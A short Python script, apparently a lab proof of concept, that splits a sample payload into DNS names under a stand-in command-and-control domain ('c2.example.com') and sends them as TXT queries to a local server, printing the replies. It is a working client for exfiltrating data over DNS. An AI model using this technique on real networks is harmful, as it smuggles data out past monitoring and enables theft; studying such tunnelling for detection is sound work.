import sys
from DNS_Research import encode, dns_query, send_udp, parse_minimal_response
import socket  

data = b"Este eh um payload bem longo transmitido via DNS em multiplos pacotes ordenados por sessao!"
domain = "c2.example.com"

fqdns = encode(data, domain)                                                                                                                                                                     
print(f"[*] Total de chunks para enviar: {len(fqdns)}")                                                                                                                                          
                                                                                                                                                                                                     
for fqdn in fqdns:                                                                                                                                                                               
    print(f"[*] Enviando query: {fqdn}")                                                                                                                                                         
    packet = dns_query(fqdn, "TXT")                                                                                                                                                              
    response = send_udp(packet, server="127.0.0.1", port=8080)                                                                                                                                   
                                                                                                                                                                                                     
    result = parse_minimal_response(response)                                                                                                                                                    
    if result and result["type"] == 16:                                                                                                                                                          
        txt_len = result["rdata"][0]                                                                                                                                                             
        txt_msg = result["rdata"][1:1 + txt_len].decode("ascii", errors="replace")                                                                                                               
        print(f"    [<] Resposta do server: {txt_msg}")